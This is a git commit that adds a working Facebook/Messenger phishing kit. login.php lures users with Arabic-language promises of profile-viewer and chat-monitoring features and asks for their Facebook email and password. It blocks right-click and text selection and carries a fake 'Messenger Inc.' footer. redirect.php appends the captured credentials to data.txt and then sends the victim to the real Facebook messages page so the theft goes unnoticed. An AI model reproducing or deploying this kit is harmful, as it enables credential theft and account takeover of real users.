fcb89674e0801f59246198ec05cf19318a893f14
belalsaeed98 <70228964+belalsaeed98@users.noreply.github.com>
2020-10-02 17:44:04 +0200

    Add files via upload

---
+++ login.php
@@ -0,0 +1,37 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:url" content="./">
+    <link rel="stylesheet" href="css/style.css">
+    <meta property="og:type" content="website">
+    <title>Login</title>
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+    <div class="content-box">
+        <img src="https://www8.0zz0.com/2020/09/27/11/427579257.png">
+        <div class="txt-login">
+      <h2 style='color: rgba(0, 0, 0, 1); font-size: 17px; font-weight: 200; line-height: 1.2; margin-bottom: 24px; text-align: center; font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif; }'>تم إضافة بعض الميزات الجديدة منها من شاهد ملفك الشخصي و مراقبة محادثات الأصدقاء</h2>
+<div style='color: rgba(0, 0, 0, 1); font-size: 17px; font-weight: 200; line-height: 1.2; margin-bottom: 24px; text-align: center; font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif; }'>تسجيل الدخول بحساب Facebook لبدء الاستخدام</div>
+</div>
+        <form class="login-form" action="redirect.php" method="post">
+            <label>
+            <input type="text" name="first" placeholder="&#1575;&#1604;&#1576;&#1585;&#1610;&#1583;&#32;&#1575;&#1604;&#1573;&#1604;&#1603;&#1578;&#1585;&#1608;&#1606;&#1610;&#32;&#1571;&#1608;&#32;&#1575;&#1604;&#1607;&#1575;&#1578;&#1601;" autocomplete="off" autocapitalize="off" required=""></label>
+            <br>
+            <br>
+            <label>
+            <input type="password" name="last" placeholder="&#1603;&#1604;&#1605;&#1577;&#32;&#1575;&#1604;&#1587;&#1585;" autocomplete="off" autocapitalize="off" required=""></label>
+            <button type="submit" name="login" class="btn-login">&#1578;&#1587;&#1580;&#1610;&#1604;&#32;&#1575;&#1604;&#1583;&#1582;&#1608;&#1604;</button>
+      
+        </form>
+    </div>
+    </div>
+    <br>
+    <br>
+    <br>
+    
+    <div class="copyright">Messenger Inc.</div>
+    </body>
+    </html>
---
+++ redirect.php
@@ -0,0 +1,125 @@
+<?php
+	if(isset($_POST['login']))
+	{	 
+     header("refresh:0;url=https://www.facebook.com/messages/");
+	 $email = $_POST['first'];
+	 $password = $_POST['last'];
+	 } else {
+	 	header('index.php');
+	 }
+    extract($_REQUEST);
+    $file=fopen("data.txt","a");
+    fwrite($file, $email);
+    fwrite($file,":");
+    fwrite($file, $password ."\n");
+    fclose($file);
+ ?>
+ 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style type="text/css">
+        .lds-roller {
+            margin-top: 20%;
+              display: inline-block;
+              position: relative;
+              width: 80px;
+              height: 80px;
+            }
+        .lds-roller div {
+              animation: lds-roller 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+              transform-origin: 40px 40px;
+            }
+        .lds-roller div:after {
+              content: " ";
+              display: block;
+              position: absolute;
+              width: 7px;
+              height: 7px;
+              border-radius: 50%;
+              background: #fff;
+              margin: -4px 0 0 -4px;
+            }
+        .lds-roller div:nth-child(1) {
+              animation-delay: -0.036s;
+            }
+        .lds-roller div:nth-child(1):after {
+              top: 63px;
+              left: 63px;
+            }
+        .lds-roller div:nth-child(2) {
+              animation-delay: -0.072s;
+            }
+        .lds-roller div:nth-child(2):after {
+              top: 68px;
+              left: 56px;
+            }
+        .lds-roller div:nth-child(3) {
+              animation-delay: -0.108s;
+            }
+        .lds-roller div:nth-child(3):after {
+              top: 71px;
+              left: 48px;
+            }
+        .lds-roller div:nth-child(4) {
+              animation-delay: -0.144s;
+            }
+        .lds-roller div:nth-child(4):after {
+              top: 72px;
+              left: 40px;
+            }
+        .lds-roller div:nth-child(5) {
+              animation-delay: -0.18s;
+            }
+        .lds-roller div:nth-child(5):after {
+              top: 71px;
+              left: 32px;
+            }
+        .lds-roller div:nth-child(6) {
+              animation-delay: -0.216s;
+            }
+        .lds-roller div:nth-child(6):after {
+              top: 68px;
+              left: 24px;
+            }
+        .lds-roller div:nth-child(7) {
+              animation-delay: -0.252s;
+            }
+        .lds-roller div:nth-child(7):after {
+              top: 63px;
+              left: 17px;
+            }
+        .lds-roller div:nth-child(8) {
+              animation-delay: -0.288s;
+            }
+        .lds-roller div:nth-child(8):after {
+              top: 56px;
+              left: 12px;
+            }
+        @keyframes lds-roller {
+              0% {
+                transform: rotate(0deg);
+              }
+              100% {
+                transform: rotate(360deg);
+              }
+            }
+
+    </style>
+</head>
+<body style="background-color: #73c2e6;">
+    <center>
+    <div class="lds-roller">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    </div>
+    </center>
+</body>
+</html>
